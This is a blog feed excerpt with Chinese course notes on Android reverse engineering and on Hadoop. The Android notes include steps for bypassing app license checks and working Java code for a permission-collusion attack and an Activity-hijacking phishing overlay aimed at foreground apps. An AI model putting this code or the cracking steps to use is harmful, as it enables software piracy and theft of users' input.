+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/Java/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Java" scheme="prayer007007.github.io/tags/Java/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>android逆向学习笔记01</title>
+    <link href="prayer007007.github.io/2018/09/10/android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/"/>
+    <id>prayer007007.github.io/2018/09/10/android逆向学习笔记01/</id>
+    <published>2018-09-09T19:18:15.000Z</published>
+    <updated>2018-09-09T11:19:24.635Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>android逆向分析-i春秋基础bitxiongxi@qq.com//note01一.Dalvik虚拟机二.静态分析三.静态分析应用：应用破解与系统攻击</code></pre><a id="more"></a>    <pre><code>《Android软件安全与逆向分析》丰生强著android系统架构：linux内核： （软件与硬件之间的一层，提供驱动）    Display Driver    Camera Driver    Flash Memory Driver    Binder(IPC) Driver    Keypad Driver    WiFi Driver    Audio Driver    Power Management    ....Libraries（系统库）(C/C++写的)    Surface Manager    Media Framework    SQLite    OpenGL | ES    FreeType    WebKit    SGL    SSL    libc(重点)Andrioid Runtime     Core Libraries（支持java语言的jar包）    Dalvik Virtual Machine （Dalvik虚拟机，类似jvm）        （每启动一个程序的时候，都会创建一个Dalvik实例）Application Framework（应用程序框架，一堆API）(正向开发)    Activity Manager    Window Manager    Content Providers    View System    Package Manager    Telephony Manager    Resource Manager    Location Manager    Notification ManagerApplications    Home    Contacts    Phone    Browser    ...Android基础，java基础，信息安全基础//note02  Dalvik虚拟机（DVM）DVM和JVM的区别：    ·JVM运行的是Java字节吗，DVM运行的是Dalvik字节码    ·Dalvik可执行文件（.dex）体积更小    ·虚拟机架构不同：JVM基于栈，DVM基于寄存器（用来暂时存储运算的中间器）reg：Java代码：public class Hello{    public int foo(int a,int b){        return (a+b)*(a-b);    }    main(){        Hello hello =new Hello();        sout(hello.foo(5,3));    }}(仅针对foo这个函数)Java字节码：public int foo(int,int); Code: 0:    iload_1     (i:int;load:将变量的值压到栈上；把第一个值压到栈上) 1:    iload_2 2: iadd        (栈上的1，2两个值相加,把结果再压出栈) 3: iload_1 4: iload_2 5: isub         （相减，压出栈） 6: imul        （相乘，相乘） 7: ireturn        （返回） Dalvik字节码： Hello.foo:(II)I     （函数的定义，II：两个参数都是int类型，I：返回值也是int类型） 0000: add-int v0,v3,v4     （v3和v4的值相加，再将值存到v0里面） 0002: sub-int v1,v3,v4     （相减，存到v1里面） 0004: mul-int/2addr v0,v1    （乘法，然后存到v0里面） 0005: return v0             （返回v0） Dalvik汇编语言简介： v命名法和p命名法 （通常使用的是p命名法） v命名法     p命名法         寄存器含义 v0            v0             第1个局部变量寄存器 v1         v1             第2个局部变量寄存器 ...         ...         中间的局部变量寄存器 vM-N         p0             第1个参数寄存器（通常为调用对象） ...         ...         中间的参数寄存器 vM-1         pN-1         第N个参数寄存器reg：3个局部变量和4个函数参数(包括一个this)v0,v1,v2     p0(this),p1,p2,p3类型描述符：V         voidZ         booleanB         byteS         shortC         charI         intJ         longF         floatD         doubleL         java类[         数组寄存器·DVM寄存器都是32bit的，与名称无关·J，D类型，需要相邻2个寄存器·对象类型：Ljava/lang/String；=java.lang.String·数组：[I=int[].[[I=int[][]方法：·格式：Lpackage/name/ObjectName（类名）;-&gt;MethodName(III)Z (III:3个int参数，返回boolean参数)·例子：    method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/String    等价于    String method(int,int[][],int,String,Object[])字段：    格式：Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String程序编译与反编译class-&gt;dx-&gt;（dex文件；apk包，资源文件，androidManifest.xml）-&gt;baksmali-&gt;smali文件           dex就可以运行了                 baksmali反编译工具apk类似打包程序-&gt;解压androidManifest.xml 配置文件主要的反编译器：·BakSmali（主要用这个）·DedexerDalvik指令集空操作指令：nop数据操作指令：move    move vA,vB    将vB寄存器的值赋给vA寄存器，源寄存器与目的寄存器都为4位    move-&gt;object/from 16 vAA,vBBBB    为对象赋值。源寄存器为8位，目的寄存器为16位HelloWorld.smali.class public LHelloWorld;.super Ljava/lang/Object;.method public static main([Ljava/lang/String;)V (V:void)    .registers 4  (表示4个寄存器)    .parameter      (参数是空)    .prologue     (函数实际执行内容)    #空指令    nop    nop    nop    nop    #数据定义指令    const/16 v0,0x8     (把8放到v0里面)    const/4 v1,0x5    const/4 v2,0x3    #数据操作指令    move v1, v2     （将v2值放到v1里面）    #数组操作指令    new-array v0, v0, [I     （创建一个数组，大小是第二个v0，类型是int数组，放入第一个v0里）    array-length v1, v0     （将v0的长度放入v1）    #实例操作指令    new-instance v1, Ljava/lang/StringBuilder;     #方法调用指令    invoke-direct {v1},Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V    #跳转指令    if-nez v0, :cond_0     (nez:not equals zero;如果不为0，则跳到cond_0)     goto : goto_0     (如果为0，则跳到goto_0)     :cond_0    #数据转换指令    int-to-float v2, v2    #数据运算指令    add-float v2, v2, v2    #比较指令    cmpl-float v0, v2, v2     (v2和v2比较的结果如果想等则返回0)    #字段操作指令    sget-object v0, Ljava/lang/System:-&gt;out:Ljava/io/PrintStream;        (获取System里面的out变量放入v0)    const-string v1, &quot;hello world&quot; #构造字符串 （定义一个字符串放入v1）    #方法调用指令    invoke-virtual {v0,v1},Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V    #返回指令    :goto_0    return-void.end method工具    ApkIDE（apk改之理）    ApkToolkit    jd-gui.exeDalvik版的Hello World·编译smali文件    java -jar smali.jar -o classes.dex HelloWorld.smali        (-o:输出到classes.dex)·执行程序    上传到手机：adb push classes.dex /data/local/    执行程序：adb shell dalvikvm -cp /data/local/classes.dex HelloWorldApkToolkit    将classes.dex-&gt;classes_dex.jarjd-gui.exe    查看jar文件//note03 静态分析·定义：    不运行代码的情况下（相对的），阅读反汇编代码来掌握程序功能的一种技术·两种方法：    1.阅读Dalvik字节码（通过baksmali反编译dex文件生成smali文件）    2.阅读java代码（通过dex2jar生成jar文件，再jd-gui阅读jar文件）定位关键代码常用步骤1.反编译apk (一般反编译成smali)2.通过AndroidManifest.xml查找主Activity&lt;activity android:label=&quot;@string/title_activity_main&quot; android:name=&quot;.MainActivity&quot;&gt;    &lt;intent-filter&gt;        &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; #MAIN :主Activity        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt; #LAUNCHER :通过该Activity启动,即首先进入的activity    &lt;/intent-filter&gt;&lt;/activity&gt;3.查看程序的入口函数：主Activity的OnCreate()4.查看Application类（全局，早于其他类启动）的OnCreate()函数。该函数通常用作授权检测//.MainActivity 类名 title_activity_main 标题定位关键代码：常用方法：·信息反馈法：运行时信息·特征函数法：运行时行为·顺序查看法：执行流程·代码注入法：添加Logregsmali文件格式：.class public Lcom/droider/crackme0502/MainActivity;.super Landroid/app/Activity.source &quot;mainActivity.java&quot;# instance fields.field private btnAnno:Landroid/widget/Button;.field private btnCheckSN:Landroid/widget/Button;.field private edtSN:Landroid/widget/EditText;# direct methods （直接方法）.method public constructor&lt;init&gt;()V (构造函数)    .locals 0     （局部变量0个）    .prologue    .line 19    invokde-direct {p0},Landroid/app/Activity;-&gt;&lt;init&gt;()V     （p0：当前这个对象this)    return-void.end method内部类的表示·MainActivity$1.smali:匿名内部类，多用于程序中的响应·MainActivity$SNChecker.smali:成员内部类·MainActivity.smali:外部类·this$0是内部类自动保留的一个指向所在外部类的引用。this表示父类的引用，右边的0便是引用的层数·例：    public class Outer{         //this$0        public class FirstInner{         //this$1            pulblic class SecondInner{         //this$2                public class ThirdInner{}            }        }    }·this$X型字段都被指定了synthetic(合成)属性，表明他们是被编译器合成的，虚构的，非java代码指定的字段内部类的表示：构造函数执行步骤：1.保存外部类的引用到本类的一个synthetic字段中2.调用内部类的父类的构造函数3.内部类自身初始化reg：内部类，构造函数.class public Lcom/droider/crackme0502/MainActivity$SNChecker;(成员内部类).super Ljava/lang/Object.source &quot;mainActivity.java&quot;# instance fields.field private sn:Ljava/lang/String;（sn:一般指验证码）.field final synthetic this$0:Lcom/droider/crackme0502/MainActivity;#direct methods.method public constructor&lt;init&gt;(Lcom/droider/crackme0502/MainActivity;Ljava/lang/String;)V    .locals 0    .param p2, &quot;sn&quot;     # Ljava/lang/String;    .prologue    .line 83    #将外部类引用赋给p1    iput-object p1,p0, Lcom/droider/crackme0502/MainActivity$SNChecker;-&gt;this$0:Lcom/droider/crackme0502/MainActivity;    #调用SNCheck的基类Object的构造函数    invoke-direct{p0},Ljava/lang/object;-&gt;&lt;init&gt;()V    .line 84    #调用SNCheck自身的构造函数    iput-object p2,p0 Lcom/droider/crackme0502/MainActivity$SNChecker;-&gt;sn:Ljava/lang/String;    .line 85    return-void.end method//note04     应用破解·试用版软件·网络验证安卓模拟器：    Eclipse自带有    BlueStatcks将apk拖入BlueStatcks将apk拖入ApkIDE    crypt.smali (加密解密)    R.smali（资源文件）MainActivity.smali    onCreate(){}        .locals 4        .param p1,&quot;xxx&quot;        ...        checkappKey()Z        move-result v2 (将结果保存到v2里面)        if-nez v2, :cond_2        ...        :cond_2        const v2, 0x7f03001 (是一个资源编号) (右边有搜索,将编号放入可以搜一下)        getAppKey()        decryptAppkey()     (解密函数)        这里会有一个跳转        if-ne v0,v2 :cond_3     (如果密钥匹配，就跳到cond_3)        在未授权的时候直接强行将其置成专业版的key值    保存-&gt;编译-&gt;生成xxx.apk网络验证例子：    使用前会先去网络验证是否是正版，如果不通过可能不会让使用    想断网的时候验证能不能通过：    360-&gt;演示-&gt;手机操作apkIDE-&gt;apk拖入    onClick():    getData()    new-instance: v1, Ljava/lang/Thread;    可以直接删掉cond_0 ,return-void编译-&gt;保存//note05     系统攻击·手机ROOT及其危害·串谋权限攻击·组件安全什么是ROOT？    在手机使用过程中获取操作系统root权限，即最高管理员权限手机root及其危害    root的危害        ·系统不稳定        ·病毒入侵        ·隐私数据暴露权限攻击串谋权限攻击    （联网下载文件并保存到SD卡上）    程序1的组件2不允许    程序2的组件1允许    程序1的组件2在没有权限的情况下，通过程序2的组件1联网并保存数据到SD卡reg：Download.apk (有权限)EvilDownload.apk(没有权限)在Download.apk最小化的时候，点开EvilDownload就实现了串谋攻击，就可以下载东西了&lt;uses-permission android:name=&quot;android.permission.WRITE_EXERNAL_STORAGE&quot; /&gt; (写入外置SD卡权限)&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt; （访问网络的权限）没有这两个的话是没有相应权限的MainActivity():public void onCreate(Bundle savedInstanceState){    super.onCreate(savedInstanceState);    setContentView(R.layout.activity_main);    setTitle(&quot;串谋攻击演示程序&quot;);    btn1 = (Button)findViewById(R.id.button1);    btn1.setOnClickListener(new OnClickListener(){        public void onClick(View v){            Intent intent = new Intent();     //创建Intent对象            intent.setAction(&quot;com.droider.download&quot;);            intent.putExtra(&quot;url&quot;,&quot;http://114.215.197.165/Struts2Login/    info.txt&quot;); //要下载的文件URL            String fileName = &quot;info.txt&quot;;     //保存的文件名            intent.putExtra(&quot;filename&quot;,filename);            sendBroadcast(intent); //发送广播        }    }});public class DownloadManager extends BroadcastReceiver{    @Override    public void onReceive(Context context,Intent intent){        if(intent.getAction().equals(&quot;com.droider.download&quot;)){            String url = intent.getExtras().getString(&quot;url&quot;);            String fileName = intent.getExtras().getString(&quot;filename&quot;);            Toast.makeText(context,url,Toast.LENGTH_SHORT).show();            MyAsyncTask task = new MyAsyncTask();            task.execute(url,fileName);        }    }}Activity劫持步骤：1.遍历运行中的程序2.恶意程序启动带FLAG_ACTIVITY_NEW_TASK标志的钓鱼式Activity覆盖正常的Activity3.用户在伪造的界面上进行操作4.恶意程序将信息发送到指定的网址5.切换到原来的Activitypublic class Hijacker extends Service{    private boolean started = false;    private List&lt;String&gt; mhijackingList;     //劫持的进程列表    private Timer mTimer = new Timer();    private TimerTask mTask = new TimerTask(){        @Override        public void run(){            Log.d(&quot;com.droider.hijacker&quot;,&quot;timertask start...&quot;);            ActivityManager am = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE;            started = true;            List&lt;RunningAppProcessInfo&gt; infos = am.getRunningAppProcesses();//枚举正在运行的进程列表            for(RunningAppProcessInfo psinfo: infos){                if(psinfo.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND)//前台进程                    if(mhijackingList.contains(psinfo.processName)){                        Log.d(&quot;com.droider.hijacker&quot;,&quot;hijacking start...&quot;);                        Intent intent = new Intent(getBaseContext(),HijackActivity.class);                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);                        intent.putExtra(&quot;processname&quot;,psinfo.processName);                        getApplication().startActivity(intent);//启动伪造的Activity                    }            }        }    }    @Override    public int onStartCommand(Intent intent,int flags,int startId){        Log.d(&quot;com.droider.jijacker&quot;,&quot;service start..&quot;);        mhijackingList = ((MyApp)getApplication()).hijackingList;        if(!started)            mTimer.scheduleAtFixedRate(mTask,2000,1500);//定时检查启动的进程列表中是否有被劫持的程序        return super.onStartCommand(intent,flags,startId);    }}public class MyApp extends Application{    List&lt;String&gt; hijackingList;    @Override    public void onCreate(){        hijackingList = new ArrayList&lt;String&gt;();        hijackingList.add(&quot;com.android.music&quot;);        hijackingList.add(&quot;com.android.browser&quot;);//要劫持的进程        super.onCreate();    }}public class HijackActivity extends Activity{    private TextView tv;    @Override    public void onCreate(Bundle savedInstanceState){        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_hijack);        setTitle(&quot;Activity劫持页面&quot;)；        tv=(TextView)findViewById(R.id.tv_process);        tv.setTextColor(Color.RED);        tv.setText(&quot;被劫持的进程：&quot;);        Bundle bundle = getIntent().getExtras();        if(bundle != null){            if(bundle.containsKey(&quot;processname&quot;)){                String str = bundle.getString(&quot;processname&quot;);                tv.setText(&quot;被劫持的进程：&quot;+str);            }        }    }    @Override    public boolean onTouchEvent(MotionEvent event){        Intent intent = new Intent(HijackActivity.this,Hijacker.class);        stopService(intent);    //停止劫持服务        moveTaskToBack(true);        return super.onTouchEvent(event);    }}//可以让程序不在最近访问的程序列表里面特点：不需要声明任何权限，一般杀毒软件无法检测</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;android逆向分析-i春秋
+
+基础
+
+bitxiongxi@qq.com
+
+//note01
+
+一.Dalvik虚拟机
+二.静态分析
+三.静态分析应用：应用破解与系统攻击
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="逆向" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E9%80%86%E5%90%91/"/>
+    
+      <category term="Android" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E9%80%86%E5%90%91/Android/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E9%80%86%E5%90%91/Android/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E9%80%86%E5%90%91/Android/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="Android" scheme="prayer007007.github.io/tags/Android/"/>
+    
+      <category term="逆向" scheme="prayer007007.github.io/tags/%E9%80%86%E5%90%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>大数据学习笔记01-hadoop</title>
+    <link href="prayer007007.github.io/2018/09/10/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-hadoop/"/>
+    <id>prayer007007.github.io/2018/09/10/大数据学习笔记01-hadoop/</id>
+    <published>2018-09-09T19:15:23.000Z</published>
+    <updated>2018-09-09T11:16:39.745Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>Hadoop--炼数成金//note01 Hadoop介绍与安装。。。倒排索引（1；1） 单词出现在标识号为1的网页的编辑量是第1的位置分词难度：     字典；Page Rank    用于给每个网页价值评分Map-reduce思想：    计算PR Lucene    hadoop的起源，提供了全文检索引擎的架构nutch</code></pre><a id="more"></a>    <pre><code>HBase    列式存储（面向数据分析）（提高响应速度及I/O）Namenode        HDFS的守护程序    记录文件是如何分割成数据块的，以及这些数据块被存储到哪些节点上    对内存和I/O进行集中管理    是个单点，发生故障将使集群崩溃Secondary Namenode    监控HDFS状态的辅助后台程序    每个集群都有一个    与NameNode进行通讯，定期保存HDFS元数据快照    当NameNode故障可以作为备用NameNode使用DataNode    每台从朋务器都运行一个    负责把HDFS数据块读写到本地文件系统JobTracker    用于处理作业(用户提交代码)的后台程序    决定有哪些文件参不处理，然后切割task幵分配节点    监控task，重启失败的task(于不同的节点)    每个集群只有唯一一个JobTracker，位于Master节点TaskTracker    位于slave节点上，与datanode结合(代码与数据一起的原则)    管理各自节点上的task(由jobtracker分配)    每个节点只有一个tasktracker，但一个tasktracker可以启动多个JVM， 用于并行执行map或reduce仸务    与jobtracker交互Master与Slave    Master:Namenode、Secondary Namenode、Jobtracker。浏览器(用于观看管理界面)，其它Hadoop工具    Slave:Tasktracker、Datanode     Master不是唯一的安装：    ssh-keygen -t rsa    scp ./id_rsa.pub huang@192.168.04:/home/huang/.ssh    (名称节点的服务器)        hadoop/conf/hadoop-env.sh      //只改JAVA_HOME就行        hadoop/conf/core-site.xml        &lt;configuration&gt;            &lt;property&gt;                &lt;name&gt;fs.default.name&lt;/name&gt;                &lt;value&gt;hdfs://backup01:9000&lt;/value&gt; //指定名称节点位置            &lt;/property&gt;            &lt;property&gt;                &lt;name&gt;hadoop.tmp.dir&lt;/name&gt;     //临时路径，不指定会默认用root下的./tmp目录，一定要设置这个参数                &lt;value&gt;/home/huang/hadoop/tmp&lt;/value&gt;            &lt;/property&gt;        &lt;/configuration&gt;        hadoop/conf/hdfs-site.xml        &lt;configuration&gt;            &lt;property&gt;                &lt;name&gt;dfs.replication&lt;/name&gt;  //服务器因子                &lt;value&gt;1&lt;/value&gt;        //2代表复制2份,1不复制            &lt;/property&gt;        &lt;/configuration&gt;                hadoop/conf/mapred-site.xml        &lt;property&gt;            &lt;name&gt;mapred.job.tracker&lt;/name&gt;             &lt;value&gt;backup01:9001&lt;/value&gt;        &lt;/property&gt;        hadoop/conf/masters.xml        //填master主机名称        hadoop/conf/slaves.xml        //填slaves主机名称        vi /etc/hosts        //检查防火墙        chkconfig iptables off    (集群里面的配置几乎都一样)    scp -r ./hadoop-1.1.2 huang@192.168.0.4:/home/huang/    格式化名称节点：        bin/hadoop namenode -format        bin/start-all.sh        //处理自己连自己免密码问题        .ssh id_rsa.pub -&gt; copy -&gt; authorized_keys 在末尾粘贴        bin/start-all.sh     //启动所有的节点        //检查系统是否正常启动        /usr/jdk1.7.0_25/bin/jps     //jps：java相关进程统计伪分布式：    到本地自己给自己免密码：        只需要将.ssh/id_rsa.pub 复制成 authorized_keysCentOS,安装与编译有关的包：yum install svn     //可以部署到其他服务器yum install autoconfautomake libtool cmake yum install ncurses-develyum install openssl-develyum install gcc*安装maven    //优点：参数可以结构化写在一个xml里面    需要安装protobuf这个插件    /usr/local/bin/protocsvnmvn     //之后有一个本地库问题//测试hello world//建立一个子目录mkdir inputcd input/echo &quot;hello world&quot; &gt; test1.txtecho &quot;hello hadoop&quot; &gt; test2.txtbin/hadoop fs -ls bin/hadoop fs -put ../input ./in     //复制input到/.inbin/hadoop fs -ls bin/hadoop fs -ls ./in/*         //hadoop是没有当前路径一说的bin/hadoop fs -cat ./in/test1.txtjar包统计：bin/hadoop jar hadoop-examples-1.1.2.jar wordcount in out//out 输出文件名称 in 源文件名称bin/hadoop fs -ls ./out/out/part-r-00000             //放的是结果port:50070port:50030219.232.252.17:50070CDH安装//note02 HDFS提供分布式存储机制，提供可线性增长的海量存储能力自动数据冗余，无须使用Raid，无须另行备份为进一步分析计算提供数据基础MR在HDFS基础上进行快速分析PC组成集群即可。在任何节点，只要发布操作命令，就可以对整个HDFS系统进行统一操作//本地化数据计算，节省传输花费的时间，也是HDFS设计的原则所在包含：    NameNode    DataNode    事务日志    映像文件    SecondaryNameNodecat tmp/dfs/name/current/VERSIONnamespaceID=         //记录命名空间的标识号，就是整个集群的标识cTime=0         //这个HDFS创建的时间storageType=NAME_NODE     //存储的类型layoutVersion=-32        //-32 构造版本还有影像文件，编辑日志//每隔一段时间会有一个检查点将内存的数据写到fs里面实地保存//edits会记录用户的各个操作，当系统如果有异常崩溃的话，系统恢复时它会先加载fsimage，调用edits重做一遍；如果写过一次fsimage，在这之前的操作就没用了；cat dfs/namesecondary/current/VERSION     //备份//blk开头的文件是数据块一个文件的写是写到不同的datanode里面的冗余副本策略    //在复制冗余副本的时候用户是不能操作的机架策略    //机架一般放20多个服务器，每个机架之间用交换机相连，交换机通过一个上级交换机来连接；同一机架下的节点只经过一个交换机，所以传输速度快core-site.xml    //设置机架心跳机制    //每隔一段时间给Namenode发送一次安全模式    //安全模式下用户不能写数据，节点多的话可能会长达10多分钟    bin/hadoop dfsadmin -safemode enter     //强制进入安全模式校验和    blk_xxxx.meta     //crc校验然后写到.meta文件里,缺省值512字节产生4个字节校验和    //校验和本身很消耗性能,使用的是jvm的软件进行软计算算的。可以直接改成cpu硬计算    //性能优化一般都会到jvm里面去操作回收站    //如果打开的话需要先配置core-site.xml    //测试    bin/hadoop fs -rmr ./in/test1.txt    //会出现./Trash这个文件，相当于移到了回收站的目录恢复和清空    mv 将.Trash的文件移回来就OK了    fs -expunge     //清空元数据保护    //配置多个副本会影响namenode处理速度，但是会增加安全性。快照HDFS文件操作    hadoop没有当前目录的概念，也没有cd命令，需要绝对地址    //查看HDFS下某个文件的内容    bin/hadoop fs -cat ./in/test1.txt    //查看HDFS基本统计信息    bin/hadoop dfsadmin -report    //HDFS是不能修改，下载到linux文件改完再传回去怎么添加节点？    在新节点安装好hadoop    把namenode的有关配置文件复制到该节点    修改masters和slaves文件，增加该节点    设置ssh免密码迕出该节点    单独启劢该节点上的datanode和tasktracker(hadoop-daemon.sh start datanode/tasktracker)    运行start-balancer.sh迕行数据负载均衡    //start-dfs.sh,不需要重启集群java操作HDFS：URLCat.javapublic class URLCat{    static{        URL.setURLStreamHandlerFactory(new FsUrlStreamHandlerFactory());    }    public static void main(String[] args) throws Exception{        inputStream in = null;        try{            in = new URL(args[0]).openStream();            IOUtils.copyBytes(in,System.out,4096,false);        }finally{            IOUtils.closeStream(in);        }    }}设置Hadoop类目录    Hadoop-env.sh    export HADOOP_CLASSPATH=xxxxx/myclass设置搜索目录    ls -a         //查看隐藏文件    .bash_profile     //脚本    javac URLCat.java     //会报错,因为没有import Hadoop的包    cd hadoop/lib    //导入包之后还会报错，再指定classpath的jar路径就OK了    javac -classpath ../hadoop-core-1.1.2.jar URLCat.java    bin/hadoop URLCat hdfs://backup01/usr/huang/in/test1.txt             //运行jar    //这里没有指定端口    bin/hadoop URLCat hdfs://backup01:9000/usr/huang/in/test1.txt 下载ant下载参考书的代码并上传解开    7287OS_Code/    cd chapter2    cd HDFS_JAVA_API/    cd src设置HADOOP_HOME环境变量build.xml    loaction=&quot;build&quot;      //输出到build文件夹里/home/huang/apache-ant-1.9.2/bin/ant     //在HDFS_Java_API目录下执行~/hadoop-1.1.2/bin/hadoop jar HDFSJavaAPI.jar HDFSJavaAPIDemoC_API安装gcc (c语言的编译器)yum -y install gcc gcc-c++ autoconf make测试HDFS C_APIhdfs_cpp_demo.c#inlude &quot;hdfs.h&quot;int main(int argc,char **argv){    hdfsFS fs = hdfsConnect(&quot;backup01&quot;,9000);    if(!sf){        fprintrf(stderr,&quot;Cannot connect to HDFS.\n&quot;);        exit(-1);    }    char* fileName = &quot;demo_txt&quot;;    char* message=&quot;Welcome to HDFS C API!&quot;;    int size = strlen(message);}//bin/tar.zz.mds         没有源码的包个人配置的话 编译gcc hdfs_app_demo.c \-I $HADOOP_HOME/src/c++/libhdfs \         //-I 包含-I $JAVA_HOME/include \-I $JAVA_HOME/include/linux/ \-L $HADOOP_HOME/c++/Linux-amd64-64/lib/ -lhdfs \     //-L 连接库的路径-L $JAVA_HOME/jre/lib/amd64/server -ljvm \-o hdfs_cpp_demo            // -o 输出利用之前ant输出设置CLASSPATH环境变量    要把Hadoop所有的jar包都列进去利用ant打印环境变量    /home/xxx/ant print -cp    export CLASSPATH=xxxxx//要在同一命令行下执行    LD_LIBRARY_PATH=$HADOOP_HOME/xxx/amd64/server ./hdfs_cpp_demojava解读：FileSystempublic class FileSystemCat{    main() throws Exception{        String uri = args[0];        Configuration conf = new Configuration();        FIleSystem fs = FileSystem.get(URI.create(uri),conf);        InputStream in = null;        try{            in = fs.open(new Path(uri));            IOUtils.copyBytes(in,System.out,4096,false);     //hadoop包的        }finally{            IOUtils.closeStream(in);        }    }}hadoop FileSystemCat hdfs://localhost/user/tom/quangle.txt//C程序可以查看hdfs.h这个文件了解APIHadoop 2.x     (namenode不再是单点)    HDFS HA    管理命令手册    块池        同一个datanode可以存着属于多个block pool的多个块//hadoop_v4_02g    hdfs-site.xml        dfs.nameservices            &lt;value&gt;ns1,ns2&lt;/value&gt;            ...    格式化名称节点    HDFS快照    快照位置        hdfs dfs -ls /foo/.snapshot//note03 HDFS HA联邦安装DNS安装    yum -y install bind bind-utils bind-chroot    rpm -qa | grep &apos;^bind&apos;         //查看是否安装成功    vim /etc/named.conf    options{        listen-on port 53 { 127.0.0.1;}-&gt;                            { any; }        allow-query {localhost;} -&gt; { any; }     //对所有用户开放    }    vim /etc/named.rfc1912.zones    //末尾添加    zone &quot;hadoop.com&quot; IN {     //正解区域        type master;        file &quot;named.hadoop.com&quot;;        allow-update { none; };    }    zone &quot;0.168.192.in-addr.arpa&quot; IN {     //反解区域        type master;        file &quot;named.192.168.0.zone&quot;;        allow-update { none; };    }cp -p named.localhost named.hadoop.com         //复制的时候保持文件权限不变vim named.hadoop.com    IN SOA     user3.hadoop.com. grid.user3.hadoop.com. (                                    0        ; serial                                    1D        ; refresh                                    1H        ; retry                                    1W        ; expire                                    3H )     ; minimum    IN NS user3.hadoop.com.user3.hadoop.com. IN A 192.168.0.109user3.hadoop.com. IN A 192.168.0.110user3.hadoop.com. IN A 192.168.0.111user3.hadoop.com. IN A 192.168.0.112user3.hadoop.com. IN A 192.168.0.113user3.hadoop.com. IN A 192.168.0.114                                    [named] cp -p named.localhost named.192.168.0.zonevim named.192.168.0.zone    IN SOA     user3.hadoop.com. grid.user3.hadoop.com. (                                    0        ; serial                                    1D        ; refresh                                    1H        ; retry                                    1W        ; expire                                    3H )     ; minimum    IN NS user3.hadoop.com.109 IN PTR user3.hadoop.com.110 IN PTR user3.hadoop.com.111 IN PTR user3.hadoop.com.112 IN PTR user3.hadoop.com.113 IN PTR user3.hadoop.com.114 IN PTR user3.hadoop.com.//slave     vim /etc/sysconfig/network-scripts/ifcfg-eth0            //末尾添加DNS服务器IP地址            DNS1=192.168.0.109            //在每台slave添加service network restartservice named start     //启动DNSchkconfig named on         //开机就将DNS服务启动//检查chkconfig --list namedchkconfig --level 123456 named offtail -n /var/log/messages | grep named//测试主机名解析nslookup user3.hadoop.comHDFS HA + 联邦 + Resource Manager HA//安装好DNS之后cat /etc/resolv.conf     //查看nslookup www.dataguru.cn     //测试NFS     (网络文件系统)    可以设置配置文件把某些目录共享出去，并可以设置权限    scp -rp ./hadoop-0.20.2 grid@h1:/home/grid    awk脚本    awk &apos;{print $1}&apos;         //awk 都用单引号,以空格/制表符分隔 ，一般处理表格等文件，reg：日志文件    awk &apos;$9~/rr/{print $9}&apos;             //~包含 {}里面放执行语句    //除了awk，还要学sedcat slaveh1h2h3h4h5h6cat ./slave | awk &apos;{print &quot;scp -rp ./hadoop-0.20.2 grid@&quot;$1&quot;:/home/grid&quot;}&apos; &gt; scp_testchmod a+x scp_test         //变成可执行文件sh ./scp_test//note04 MR//超级计算机结构是非开放的，每一台都是定制的//reg：日志分析，通过hdfs切割成很多的块，分散到各个节点上，然后各个节点一起来并行计算，再把结果加起来//并行计算框架    MPI        c语言的函数库        计算密集型，算是瓶颈    PVM    CUDA        英伟达配合显卡GPU推出来的包，利用GPU多核心来处理    BOINC        互联网计算（可以当分析志愿者）    Map-Reduce        负担主要在I/O云计算目前流行的开源云计算解决方案reg：气象数据集：    zcat xxx-xx-x.gz         //查看.gz文件    解压及合并： zcat *.gz &gt; sample.txt     //按数据量大小来解压合并    分析MR    input -&gt; |有偏移量key| -&gt; map -&gt; |(key,value)| -&gt; shuffle 